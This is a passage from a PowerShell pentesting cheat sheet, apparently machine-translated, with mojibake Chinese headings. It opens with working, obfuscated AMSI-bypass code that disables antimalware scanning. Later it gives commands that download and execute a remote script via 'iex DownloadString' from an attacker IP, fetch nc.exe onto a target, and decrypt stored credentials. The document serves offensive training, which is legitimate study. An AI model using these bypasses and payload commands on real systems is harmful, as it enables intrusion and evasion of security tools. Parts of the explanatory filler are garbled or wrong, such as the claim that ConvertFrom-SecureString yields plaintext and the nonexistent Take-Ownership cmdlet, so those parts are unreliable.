&( $SHELLid[1]+$SHELlId[13]+'X') (NeW-OBJEct sYStEm.iO.coMPrESSIOn.defLAtEstReam( [iO.meMorYStReAm] [cOnvErt]::froMBaSE64StRINg( 'rVHRasJAEHzvdwhGkBAhLUXwYU7i2aKFq4mQBh8Sc6bBM5HkYmq/vruQfkF7L3s7s8vM3CXv+nRw0bb6kpm7K7UN71ftjJwk1F/WDapjnZdVcZjPo6qku+aRnW0Ic5JlXd10Y4lcNfVFpK1+8gduHPXiEestcggD6WFTiDfIAFkhPiGP+FDCQkbce1j6UErMsFbIesYD3rtCPhOPDgHtKfENecZe0TzVDNRjsRhP6LCpValN/g/GYzZGxlMlXiF9rh6CGISToZ6Nn3+Fp3+XCwtxY5kIlF++cC6S2WIDEfJ7xEPeuMeQdaftPjUdfVLVGTMd2abTk4cf'), [sysTEm.iO.cOmpResSioN.COMprEssiOnMOde]::decOMPRESs ) | foreAch{NeW-OBJEct iO.STREaMREadER( $_ , [teXt.ENCoDiNg]::aScii )}).REadtoenD( )

# Another Method: from https://github.com/HernanRodriguez1/Bypass-AMSI
${2}=[Ref].Assembly.GetType('Sy'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwB0AGUA')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQAuAE0A')))+'an'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBnAGUA')))+'m'+'en'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAAuAEEAdQA=')))+'t'+'om'+'at'+'io'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgAuAEEA')))+'ms'+'i'+'U'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABpAGwA')))+'s')
${1}=${2}.GetField('am'+'s'+'iI'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBpAHQA')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbAA=')))+'ed','No'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBQAHUA')))+'bl'+'i'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwAsAFMA')))+'ta'+'ti'+'c')
${1}.SetValue($null,$true)

# Another Method
$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$u))
$field = $assembly.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static')
$field.SetValue($null,$true)

# AMSI Bypass in python
https://fluidattacks.com/blog/amsi-bypass-python/

# Testing for Amsi Bypass:
https://github.com/rasta-mouse/AmsiScanBufferBypass

# Amsi-Bypass-Powershell
https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell

https://blog.f-secure.com/hunting-for-amsi-bypasses/
https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
https://github.com/cobbr/PSAmsi/wiki/Conducting-AMSI-Scans
https://slaeryan.github.io/posts/falcon-zero-alpha.html
```
### AMSIç»•è¿‡2-æ‰˜ç®¡APIè°ƒç”¨æŒ‚é’©

æŸ¥çœ‹[**æ­¤å¸–å­ä»¥è·å–è¯¦ç»†ä¿¡æ¯**](https://practicalsecurityanalytics.com/new-amsi-bypass-using-clr-hooking/)[**å’Œä»£ç **](https://practicalsecurityanalytics.com/new-amsi-bypass-using-clr-hooking/)ã€‚

è¿™ç§æ–°æŠ€æœ¯ä¾èµ–äºå¯¹.NETæ–¹æ³•çš„APIè°ƒç”¨æŒ‚é’©ã€‚äº‹å®è¯æ˜ï¼Œ.NETæ–¹æ³•éœ€è¦åœ¨å†…å­˜ä¸­ç¼–è¯‘ä¸ºæœ¬æœºæœºå™¨æŒ‡ä»¤ï¼Œè¿™äº›æŒ‡ä»¤çœ‹èµ·æ¥ä¸æœ¬æœºæ–¹æ³•éå¸¸ç›¸ä¼¼ã€‚è¿™äº›ç¼–è¯‘åçš„æ–¹æ³•å¯ä»¥è¢«æŒ‚é’©ä»¥æ”¹å˜ç¨‹åºçš„æ§åˆ¶æµã€‚

æ‰§è¡Œå¯¹.NETæ–¹æ³•è¿›è¡ŒAPIè°ƒç”¨æŒ‚é’©çš„æ­¥éª¤å¦‚ä¸‹ï¼š

1. ç¡®å®šè¦æŒ‚é’©çš„ç›®æ ‡æ–¹æ³•
2. å®šä¹‰ä¸€ä¸ªä¸ç›®æ ‡æ–¹æ³•å…·æœ‰ç›¸åŒå‡½æ•°åŸå‹çš„æ–¹æ³•
3. ä½¿ç”¨åå°„æ‰¾åˆ°è¿™äº›æ–¹æ³•
4. ç¡®ä¿æ¯ä¸ªæ–¹æ³•å·²ç»è¢«ç¼–è¯‘
5. æ‰¾åˆ°æ¯ä¸ªæ–¹æ³•åœ¨å†…å­˜ä¸­çš„ä½ç½®
6. ç”¨æŒ‡å‘æˆ‘ä»¬æ¶æ„æ–¹æ³•çš„æŒ‡ä»¤è¦†ç›–ç›®æ ‡æ–¹æ³•

### AMSIç»•è¿‡3-SeDebugç‰¹æƒ

é€šè¿‡[**æŒ‰ç…§æ­¤æŒ‡å—å’Œä»£ç **](https://github.com/MzHmO/DebugAmsi)ï¼Œæ‚¨å¯ä»¥çœ‹åˆ°å¦‚æœæ‹¥æœ‰è¶³å¤Ÿçš„ç‰¹æƒæ¥è°ƒè¯•è¿›ç¨‹ï¼Œæ‚¨å¯ä»¥ç”Ÿæˆä¸€ä¸ªpowershell.exeè¿›ç¨‹ï¼Œå¯¹å…¶è¿›è¡Œè°ƒè¯•ï¼Œç›‘è§†å…¶åŠ è½½`amsi.dll`å¹¶ç¦ç”¨å®ƒã€‚

## PS-å†å²è®°å½•
```powershell
Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
```
## è·å–æƒé™

To perform various actions on a Windows system, it is often necessary to have the appropriate permissions. In this section, we will explore how to use PowerShell to check and modify permissions.

### Checking Permissions

To check the permissions of a file or directory, we can use the `Get-Acl` cmdlet. This cmdlet retrieves the access control list (ACL) for the specified object.

```powershell
Get-Acl -Path C:\path\to\file.txt
```

This command will display the permissions associated with the specified file.

### Modifying Permissions

To modify permissions, we can use the `Set-Acl` cmdlet. This cmdlet allows us to change the ACL of a file or directory.

```powershell
Set-Acl -Path C:\path\to\file.txt -AclObject $acl
```

In this command, `$acl` represents the new ACL that we want to apply to the file.

### Taking Ownership

Sometimes, it may be necessary to take ownership of a file or directory in order to modify its permissions. To do this, we can use the `Take-Ownership` function.

```powershell
Take-Ownership -Path C:\path\to\file.txt
```

This function will change the ownership of the specified file to the current user.

### Summary

In this section, we have learned how to use PowerShell to check and modify permissions on a Windows system. By understanding and manipulating permissions, we can gain greater control over the system and perform various actions as needed.
```powershell
Get-Acl -Path "C:\Program Files\Vuln Services" | fl
```
## æ“ä½œç³»ç»Ÿç‰ˆæœ¬å’Œçƒ­è¡¥ä¸

To gather information about the operating system version and installed hotfixes, you can use the following PowerShell commands:

```powershell
# Get the operating system version
(Get-WmiObject -Class Win32_OperatingSystem).Caption

# Get the installed hotfixes
Get-HotFix
```

The first command retrieves the operating system version using the `Win32_OperatingSystem` class. The output will display the caption of the operating system.

The second command retrieves the installed hotfixes using the `Get-HotFix` cmdlet. This will provide a list of all the installed hotfixes on the system, including their description, hotfix ID, and installation date.

By running these commands, you can gather important information about the operating system version and any installed hotfixes, which can be useful for vulnerability assessment and system hardening.
```powershell
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
## ç¯å¢ƒ

The following instructions assume that you have a Windows machine with PowerShell installed. If you don't have PowerShell installed, you can download it from the official Microsoft website.

ä»¥ä¸‹è¯´æ˜å‡è®¾æ‚¨æ‹¥æœ‰å®‰è£…äº†PowerShellçš„Windowsæœºå™¨ã€‚å¦‚æœæ‚¨æ²¡æœ‰å®‰è£…PowerShellï¼Œå¯ä»¥ä»å®˜æ–¹å¾®è½¯ç½‘ç«™ä¸‹è½½å®‰è£…ã€‚

## Basic PowerShell Commands

### Get-Help

The `Get-Help` command is used to display help information about PowerShell cmdlets and functions. You can use it to get detailed information about a specific command or to search for commands related to a specific topic.

```powershell
Get-Help <command>
```

For example, to get help information about the `Get-Process` command, you can run:

```powershell
Get-Help Get-Process
```

### Get-Command

The `Get-Command` command is used to retrieve a list of all available PowerShell commands. You can use it to search for a specific command or to get a list of commands related to a specific topic.

```powershell
Get-Command <command>
```

For example, to get a list of all commands related to the `Service` topic, you can run:

```powershell
Get-Command -Noun Service
```

### Get-Member

The `Get-Member` command is used to retrieve information about the properties and methods of an object. You can use it to explore the structure and capabilities of different PowerShell objects.

```powershell
Get-Member -InputObject <object>
```

For example, to get information about the properties and methods of the `Get-Process` command, you can run:

```powershell
Get-Process | Get-Member
```

### Select-Object

The `Select-Object` command is used to select specific properties of an object. You can use it to filter and format the output of PowerShell commands.

```powershell
Select-Object -Property <property1>, <property2>, ...
```

For example, to select the `Name` and `Id` properties of the processes returned by the `Get-Process` command, you can run:

```powershell
Get-Process | Select-Object -Property Name, Id
```

### Where-Object

The `Where-Object` command is used to filter objects based on a specified condition. You can use it to selectively process objects returned by PowerShell commands.

```powershell
Where-Object -FilterScript <condition>
```

For example, to filter the processes returned by the `Get-Process` command and only display the ones with a CPU usage greater than 50%, you can run:

```powershell
Get-Process | Where-Object { $_.CPU -gt 50 }
```

### ForEach-Object

The `ForEach-Object` command is used to process each object in a collection. You can use it to perform a specific action on each object returned by PowerShell commands.

```powershell
ForEach-Object -Process { <action> }
```

For example, to stop all running processes returned by the `Get-Process` command, you can run:

```powershell
Get-Process | ForEach-Object -Process { Stop-Process -Id $_.Id }
```

### Set-ExecutionPolicy

The `Set-ExecutionPolicy` command is used to set the execution policy for PowerShell scripts. The execution policy determines whether PowerShell scripts can be run on a system.

```powershell
Set-ExecutionPolicy -ExecutionPolicy <policy>
```

For example, to set the execution policy to `RemoteSigned`, which allows running local scripts but requires remote scripts to be signed, you can run:

```powershell
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned
```

### Start-Process

The `Start-Process` command is used to start a new process. You can use it to run external programs or scripts from within PowerShell.

```powershell
Start-Process -FilePath <path>
```

For example, to start the Notepad application, you can run:

```powershell
Start-Process -FilePath notepad.exe
```

### Invoke-Expression

The `Invoke-Expression` command is used to evaluate and execute a string as a PowerShell command. You can use it to dynamically execute commands based on user input or other variables.

```powershell
Invoke-Expression -Command <command>
```

For example, to execute the command stored in a variable `$cmd`, you can run:

```powershell
Invoke-Expression -Command $cmd
```

### Out-File

The `Out-File` command is used to redirect the output of a PowerShell command to a file. You can use it to save the output of a command for later analysis or processing.

```powershell
<command> | Out-File -FilePath <path>
```

For example, to save the output of the `Get-Process` command to a file named `processes.txt`, you can run:

```powershell
Get-Process | Out-File -FilePath processes.txt
```

### Import-Csv

The `Import-Csv` command is used to import data from a CSV file into PowerShell. You can use it to read and process structured data stored in CSV format.

```powershell
Import-Csv -Path <path>
```

For example, to import data from a CSV file named `data.csv`, you can run:

```powershell
Import-Csv -Path data.csv
```

### Export-Csv

The `Export-Csv` command is used to export data from PowerShell to a CSV file. You can use it to save structured data in CSV format for further analysis or sharing.

```powershell
<command> | Export-Csv -Path <path>
```

For example, to export the output of the `Get-Process` command to a CSV file named `processes.csv`, you can run:

```powershell
Get-Process | Export-Csv -Path processes.csv
```
```powershell
Get-ChildItem Env: | ft Key,Value #get all values
$env:UserName @Get UserName value
```
## å…¶ä»–å·²è¿æ¥çš„é©±åŠ¨å™¨

When conducting a penetration test on a Windows system, it is important to gather as much information as possible about the target. One valuable piece of information is the list of connected drives on the system. This can help identify additional storage devices or network shares that may contain sensitive data.

In PowerShell, you can use the `Get-PSDrive` cmdlet to retrieve a list of all connected drives. This cmdlet provides information about both local and remote drives, including drive letters, drive types, and the root directory of each drive.

To retrieve the list of connected drives, open a PowerShell session and run the following command:

```powershell
Get-PSDrive
```

This will display a table with information about each connected drive, including the drive letter, drive type, and root directory. The drive type can be one of the following:

- **FileSystem**: This indicates a local disk drive.
- **Registry**: This indicates a registry hive.
- **Alias**: This indicates a PowerShell alias.
- **Variable**: This indicates a PowerShell variable.
- **Function**: This indicates a PowerShell function.
- **Certificate**: This indicates a certificate store.
- **Environment**: This indicates an environment variable.

By examining the list of connected drives, you can identify potential targets for further investigation during your penetration test. For example, you may want to explore the contents of a network share or search for sensitive files on a specific drive.

Remember to always obtain proper authorization before conducting any penetration testing activities.
```powershell
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
### å›æ”¶ç«™

The Recycle Bin is a feature in Windows that allows users to temporarily store deleted files and folders. Instead of permanently deleting files, they are moved to the Recycle Bin where they can be easily restored if needed. This provides a safety net for users who accidentally delete important files.

The Recycle Bin can be accessed by double-clicking on its icon on the desktop or by opening the File Explorer and navigating to the Recycle Bin folder. Once inside the Recycle Bin, users can browse through the deleted files and folders, and choose to restore them to their original location or permanently delete them.

It is important to note that the Recycle Bin has a storage limit, and once it reaches its maximum capacity, older files will be automatically deleted to make room for new ones. Therefore, it is recommended to regularly empty the Recycle Bin to free up disk space.

As a pentester, it is crucial to be aware of the Recycle Bin as it can potentially contain sensitive information that has been deleted by the user. By accessing the Recycle Bin, a pentester may be able to recover deleted files and gain valuable insights or leverage them for further exploitation.
```powershell
$shell = New-Object -com shell.application
$rb = $shell.Namespace(10)
$rb.Items()
```
[https://jdhitsolutions.com/blog/powershell/7024/managing-the-recycle-bin-with-powershell/](https://jdhitsolutions.com/blog/powershell/7024/managing-the-recycle-bin-with-powershell/)

## åŸŸåä¾¦æŸ¥

{% content-ref url="powerview.md" %}
[powerview.md](powerview.md)
{% endcontent-ref %}

## ç”¨æˆ·
```powershell
Get-LocalUser | ft Name,Enabled,Description,LastLogon
Get-ChildItem C:\Users -Force | select Name
```
## å°†å®‰å…¨å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ˜æ–‡

When performing penetration testing or other security assessments, it is common to encounter scenarios where sensitive information, such as passwords or encryption keys, is stored as secure strings in PowerShell scripts or configurations. Secure strings are encrypted and can only be decrypted on the same machine and by the same user account that encrypted them.

åœ¨è¿›è¡Œæ¸—é€æµ‹è¯•æˆ–å…¶ä»–å®‰å…¨è¯„ä¼°æ—¶ï¼Œç»å¸¸ä¼šé‡åˆ°å°†æ•æ„Ÿä¿¡æ¯ï¼ˆå¦‚å¯†ç æˆ–åŠ å¯†å¯†é’¥ï¼‰å­˜å‚¨ä¸ºå®‰å…¨å­—ç¬¦ä¸²çš„ PowerShell è„šæœ¬æˆ–é…ç½®çš„æƒ…å†µã€‚å®‰å…¨å­—ç¬¦ä¸²æ˜¯åŠ å¯†çš„ï¼Œåªèƒ½åœ¨ç›¸åŒçš„è®¡ç®—æœºå’Œç›¸åŒçš„ç”¨æˆ·å¸æˆ·ä¸Šè§£å¯†ã€‚

However, as a pentester, you may need to convert these secure strings back to plaintext for further analysis or exploitation. This can be achieved using the `ConvertFrom-SecureString` cmdlet in PowerShell.

ç„¶è€Œï¼Œä½œä¸ºæ¸—é€æµ‹è¯•äººå‘˜ï¼Œæ‚¨å¯èƒ½éœ€è¦å°†è¿™äº›å®‰å…¨å­—ç¬¦ä¸²è½¬æ¢å›æ˜æ–‡ï¼Œä»¥ä¾¿è¿›è¡Œè¿›ä¸€æ­¥çš„åˆ†ææˆ–åˆ©ç”¨ã€‚å¯ä»¥ä½¿ç”¨ PowerShell ä¸­çš„ `ConvertFrom-SecureString` å‘½ä»¤æ¥å®ç°è¿™ä¸€ç›®æ ‡ã€‚

Here is an example of how to use `ConvertFrom-SecureString`:

ä»¥ä¸‹æ˜¯ä½¿ç”¨ `ConvertFrom-SecureString` çš„ç¤ºä¾‹ï¼š

```powershell
$secureString = Read-Host -AsSecureString
$plainText = ConvertFrom-SecureString $secureString
$plainText
```

In this example, the `Read-Host` cmdlet is used to securely prompt the user for a secure string. The entered secure string is then converted to plaintext using `ConvertFrom-SecureString` and stored in the `$plainText` variable. Finally, the plaintext value is displayed.

åœ¨æ­¤ç¤ºä¾‹ä¸­ï¼Œä½¿ç”¨ `Read-Host` å‘½ä»¤ä»¥å®‰å…¨æ–¹å¼æç¤ºç”¨æˆ·è¾“å…¥å®‰å…¨å­—ç¬¦ä¸²ã€‚ç„¶åï¼Œä½¿ç”¨ `ConvertFrom-SecureString` å°†è¾“å…¥çš„å®‰å…¨å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ˜æ–‡ï¼Œå¹¶å°†å…¶å­˜å‚¨åœ¨ `$plainText` å˜é‡ä¸­ã€‚æœ€åï¼Œæ˜¾ç¤ºæ˜æ–‡å€¼ã€‚

It is important to note that the conversion from secure string to plaintext is only possible on the same machine and by the same user account that encrypted the secure string. Additionally, the secure string should be handled with care as it contains sensitive information.

éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå°†å®‰å…¨å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ˜æ–‡åªèƒ½åœ¨ç›¸åŒçš„è®¡ç®—æœºå’Œç›¸åŒçš„ç”¨æˆ·å¸æˆ·ä¸Šè¿›è¡Œï¼Œè¿™ä¸åŠ å¯†å®‰å…¨å­—ç¬¦ä¸²çš„ç”¨æˆ·å¸æˆ·ç›¸åŒã€‚æ­¤å¤–ï¼Œåº”è°¨æ…å¤„ç†å®‰å…¨å­—ç¬¦ä¸²ï¼Œå› ä¸ºå®ƒåŒ…å«æ•æ„Ÿä¿¡æ¯ã€‚
```powershell
$pass = "01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692" | convertto-securestring
$user = "HTB\Tom"
$cred = New-Object System.management.Automation.PSCredential($user, $pass)
$cred.GetNetworkCredential() | fl

UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB
```
æˆ–è€…ç›´æ¥è§£æXMLè¡¨å•ï¼š
```powershell
$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *

UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB
```
## SUDO

SUDO æ˜¯ä¸€ç§åœ¨ Linux å’Œ Unix ç³»ç»Ÿä¸Šä½¿ç”¨çš„å‘½ä»¤ï¼Œå®ƒå…è®¸æ™®é€šç”¨æˆ·ä»¥è¶…çº§ç”¨æˆ·çš„èº«ä»½æ‰§è¡Œç‰¹æƒå‘½ä»¤ã€‚è¿™å¯¹äºç³»ç»Ÿç®¡ç†å‘˜å’Œå®‰å…¨ä¸“å®¶æ¥è¯´éå¸¸æœ‰ç”¨ï¼Œå› ä¸ºå®ƒæä¾›äº†ä¸€ç§é™åˆ¶ç”¨æˆ·æƒé™çš„æ–¹æ³•ï¼Œä»¥é˜²æ­¢æ»¥ç”¨å’Œæ½œåœ¨çš„å®‰å…¨æ¼æ´ã€‚

SUDO çš„åŸºæœ¬ç”¨æ³•æ˜¯åœ¨å‘½ä»¤å‰åŠ ä¸Š `sudo` å…³é”®å­—ï¼Œç„¶åè¾“å…¥ç”¨æˆ·çš„å¯†ç è¿›è¡Œèº«ä»½éªŒè¯ã€‚ä¸€æ—¦éªŒè¯æˆåŠŸï¼Œç”¨æˆ·å°±å¯ä»¥æ‰§è¡Œç‰¹æƒå‘½ä»¤ï¼Œå¦‚å®‰è£…è½¯ä»¶ã€ä¿®æ”¹ç³»ç»Ÿé…ç½®ç­‰ã€‚

ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸ç”¨çš„ SUDO å‘½ä»¤ç¤ºä¾‹ï¼š

- `sudo apt-get update`ï¼šæ›´æ–°è½¯ä»¶åŒ…åˆ—è¡¨ã€‚
- `sudo apt-get install <package>`ï¼šå®‰è£…ç‰¹å®šè½¯ä»¶åŒ…ã€‚
- `sudo systemctl restart <service>`ï¼šé‡æ–°å¯åŠ¨ç‰¹å®šçš„ç³»ç»ŸæœåŠ¡ã€‚
- `sudo useradd <username>`ï¼šåˆ›å»ºæ–°ç”¨æˆ·ã€‚
- `sudo passwd <username>`ï¼šæ›´æ”¹ç”¨æˆ·å¯†ç ã€‚

è¯·æ³¨æ„ï¼Œä½¿ç”¨ SUDO å‘½ä»¤éœ€è¦è°¨æ…ï¼Œå› ä¸ºé”™è¯¯çš„ä½¿ç”¨å¯èƒ½å¯¼è‡´ç³»ç»Ÿæ•…éšœæˆ–å®‰å…¨é—®é¢˜ã€‚å»ºè®®ä»…åœ¨å¿…è¦æ—¶ä½¿ç”¨ SUDOï¼Œå¹¶ç¡®ä¿åªæˆäºˆå¿…è¦çš„ç‰¹æƒã€‚
```powershell
#CREATE A CREDENTIAL OBJECT
$pass = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("<USERNAME>", $pass)

#For local:
Start-Process -Credential ($cred)  -NoNewWindow powershell "iex (New-Object Net.WebClient).DownloadString('http://10.10.14.11:443/ipst.ps1')"

#For WINRM
#CHECK IF CREDENTIALS ARE WORKING EXECUTING whoami (expected: username of the credentials user)
Invoke-Command -Computer ARKHAM -ScriptBlock { whoami } -Credential $cred
#DOWNLOAD nc.exe
Invoke-Command -Computer ARKHAM -ScriptBlock { IWR -uri 10.10.14.17/nc.exe -outfile nc.exe } -credential $cred

Start-Process powershell -Credential $pp -ArgumentList '-noprofile -command &{Start-Process C:\xyz\nc.bat -verb Runas}'

#Another method
$secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
$computer = "<hostname>"
```
## ç”¨æˆ·ç»„

In Windows, user groups are used to manage and organize users with similar permissions and access rights. By assigning users to specific groups, administrators can easily control and enforce security policies across the system.

åœ¨Windowsä¸­ï¼Œç”¨æˆ·ç»„ç”¨äºç®¡ç†å’Œç»„ç»‡å…·æœ‰ç›¸ä¼¼æƒé™å’Œè®¿é—®æƒé™çš„ç”¨æˆ·ã€‚é€šè¿‡å°†ç”¨æˆ·åˆ†é…åˆ°ç‰¹å®šçš„ç»„ä¸­ï¼Œç®¡ç†å‘˜å¯ä»¥è½»æ¾åœ°åœ¨æ•´ä¸ªç³»ç»Ÿä¸­æ§åˆ¶å’Œæ‰§è¡Œå®‰å…¨ç­–ç•¥ã€‚

### Built-in Groups

### å†…ç½®ç»„

Windows provides several built-in groups that serve specific purposes:

Windowsæä¾›äº†å‡ ä¸ªå†…ç½®ç»„ï¼Œç”¨äºç‰¹å®šç›®çš„ï¼š

- **Administrators**: Members of this group have full control over the system and can perform administrative tasks.

- **Administrators**ï¼šè¯¥ç»„çš„æˆå‘˜å¯¹ç³»ç»Ÿæ‹¥æœ‰å®Œå…¨æ§åˆ¶æƒï¼Œå¹¶å¯ä»¥æ‰§è¡Œç®¡ç†ä»»åŠ¡ã€‚

- **Users**: This group includes all standard users who can perform common tasks but do not have administrative privileges.

- **Users**ï¼šè¯¥ç»„åŒ…æ‹¬æ‰€æœ‰æ ‡å‡†ç”¨æˆ·ï¼Œä»–ä»¬å¯ä»¥æ‰§è¡Œå¸¸è§ä»»åŠ¡ï¼Œä½†æ²¡æœ‰ç®¡ç†å‘˜æƒé™ã€‚

- **Guests**: Users in this group have limited access and are typically used for temporary or guest accounts.

- **Guests**ï¼šè¯¥ç»„ä¸­çš„ç”¨æˆ·å…·æœ‰æœ‰é™çš„è®¿é—®æƒé™ï¼Œé€šå¸¸ç”¨äºä¸´æ—¶æˆ–è®¿å®¢è´¦æˆ·ã€‚

- **Power Users**: This group has more privileges than standard users but fewer than administrators. It is deprecated in newer versions of Windows.

- **Power Users**ï¼šè¯¥ç»„æ¯”æ ‡å‡†ç”¨æˆ·å…·æœ‰æ›´å¤šçš„æƒé™ï¼Œä½†æ¯”ç®¡ç†å‘˜å°‘ã€‚åœ¨è¾ƒæ–°çš„Windowsç‰ˆæœ¬ä¸­å·²è¢«å¼ƒç”¨ã€‚

- **Backup Operators**: Members of this group can perform backup and restore operations on the system.

- **Backup Operators**ï¼šè¯¥ç»„çš„æˆå‘˜å¯ä»¥åœ¨ç³»ç»Ÿä¸Šæ‰§è¡Œå¤‡ä»½å’Œæ¢å¤æ“ä½œã€‚

- **Remote Desktop Users**: Users in this group can access the system remotely using Remote Desktop.

- **Remote Desktop Users**ï¼šè¯¥ç»„ä¸­çš„ç”¨æˆ·å¯ä»¥ä½¿ç”¨è¿œç¨‹æ¡Œé¢è¿œç¨‹è®¿é—®ç³»ç»Ÿã€‚

### Creating and Managing Groups

### åˆ›å»ºå’Œç®¡ç†ç»„

Administrators can create custom groups to meet specific requirements. To create a group, you can use the PowerShell `New-LocalGroup` cmdlet:

ç®¡ç†å‘˜å¯ä»¥åˆ›å»ºè‡ªå®šä¹‰ç»„ä»¥æ»¡è¶³ç‰¹å®šè¦æ±‚ã€‚è¦åˆ›å»ºä¸€ä¸ªç»„ï¼Œå¯ä»¥ä½¿ç”¨PowerShellçš„`New-LocalGroup`å‘½ä»¤ï¼š

```powershell
New-LocalGroup -Name "GroupName"
```

To add users to a group, you can use the `Add-LocalGroupMember` cmdlet:

è¦å°†ç”¨æˆ·æ·»åŠ åˆ°ç»„ä¸­ï¼Œå¯ä»¥ä½¿ç”¨`Add-LocalGroupMember`å‘½ä»¤ï¼š

```powershell
Add-LocalGroupMember -Group "GroupName" -Member "Username"
```

To remove users from a group, you can use the `Remove-LocalGroupMember` cmdlet:

è¦ä»ç»„ä¸­åˆ é™¤ç”¨æˆ·ï¼Œå¯ä»¥ä½¿ç”¨`Remove-LocalGroupMember`å‘½ä»¤ï¼š

```powershell
Remove-LocalGroupMember -Group "GroupName" -Member "Username"
```

### Group Policy Objects (GPOs)

### ç»„ç­–ç•¥å¯¹è±¡ï¼ˆGPOï¼‰

Group Policy Objects (GPOs) are used to manage and enforce security settings across multiple systems in a Windows domain. GPOs can be used to configure various settings, including user rights, password policies, software installation, and more.

ç»„ç­–ç•¥å¯¹è±¡ï¼ˆGPOï¼‰ç”¨äºåœ¨WindowsåŸŸä¸­ç®¡ç†å’Œæ‰§è¡Œå®‰å…¨è®¾ç½®ã€‚GPOå¯ç”¨äºé…ç½®å„ç§è®¾ç½®ï¼ŒåŒ…æ‹¬ç”¨æˆ·æƒé™ã€å¯†ç ç­–ç•¥ã€è½¯ä»¶å®‰è£…ç­‰ã€‚

To create a new GPO, you can use the `New-GPO` cmdlet:

è¦åˆ›å»ºæ–°çš„GPOï¼Œå¯ä»¥ä½¿ç”¨`New-GPO`å‘½ä»¤ï¼š

```powershell
New-GPO -Name "GPOName"
```

To link a GPO to a specific domain or organizational unit (OU), you can use the `New-GPLink` cmdlet:

è¦å°†GPOé“¾æ¥åˆ°ç‰¹å®šçš„åŸŸæˆ–ç»„ç»‡å•ä½ï¼ˆOUï¼‰ï¼Œå¯ä»¥ä½¿ç”¨`New-GPLink`å‘½ä»¤ï¼š

```powershell
New-GPLink -Name "GPOName" -Target "Domain" -LinkEnabled Yes
```

To enforce a GPO on a specific system, you can use the `Invoke-GPUpdate` cmdlet:

è¦åœ¨ç‰¹å®šç³»ç»Ÿä¸Šå¼ºåˆ¶æ‰§è¡ŒGPOï¼Œå¯ä»¥ä½¿ç”¨`Invoke-GPUpdate`å‘½ä»¤ï¼š

```powershell
Invoke-GPUpdate -Computer "ComputerName" -Force
```

### Conclusion

### ç»“è®º

Understanding and managing user groups is essential for effective system administration and security. By properly assigning users to groups and configuring Group Policy Objects, administrators can ensure that the system remains secure and organized.

äº†è§£å’Œç®¡ç†ç”¨æˆ·ç»„å¯¹äºæœ‰æ•ˆçš„ç³»ç»Ÿç®¡ç†å’Œå®‰å…¨è‡³å…³é‡è¦ã€‚é€šè¿‡æ­£ç¡®åœ°å°†ç”¨æˆ·åˆ†é…åˆ°ç»„ä¸­å¹¶é…ç½®ç»„ç­–ç•¥å¯¹è±¡ï¼Œç®¡ç†å‘˜å¯ä»¥ç¡®ä¿ç³»ç»Ÿä¿æŒå®‰å…¨å’Œæœ‰åºã€‚
```powershell
Get-LocalGroup | ft Name #All groups
Get-LocalGroupMember Administrators | ft Name, PrincipalSource #Members of Administrators
```
## å‰ªè´´æ¿

The clipboard is a temporary storage area in the computer's memory that allows you to copy and paste text, images, and other data between different applications or within the same application. It is a useful feature that makes it easier to transfer information without having to retype or reformat it.

In the context of pentesting, the clipboard can be a valuable source of information. When users copy sensitive data such as passwords, credit card numbers, or confidential documents, it may remain in the clipboard temporarily. This presents an opportunity for attackers to access and extract this information.

Pentesters can leverage PowerShell to interact with the clipboard and retrieve its contents. PowerShell provides a built-in cmdlet called `Get-Clipboard` that allows you to retrieve the current contents of the clipboard. By executing this cmdlet, you can obtain any text or data that has been copied to the clipboard.

Here is an example of how to use the `Get-Clipboard` cmdlet in PowerShell:

```powershell
$clipboardContents = Get-Clipboard
$clipboardContents
```

This code will retrieve the contents of the clipboard and store them in the variable `$clipboardContents`. You can then use this variable to manipulate or analyze the data as needed.

It is important to note that accessing the clipboard may require administrative privileges or specific permissions depending on the operating system and security settings. Additionally, retrieving clipboard contents may not always be possible if the data has been cleared or overwritten.

As a pentester, it is crucial to be aware of the potential risks associated with the clipboard and to exercise caution when handling sensitive information.
```powershell
Get-Clipboard
```
## è¿›ç¨‹

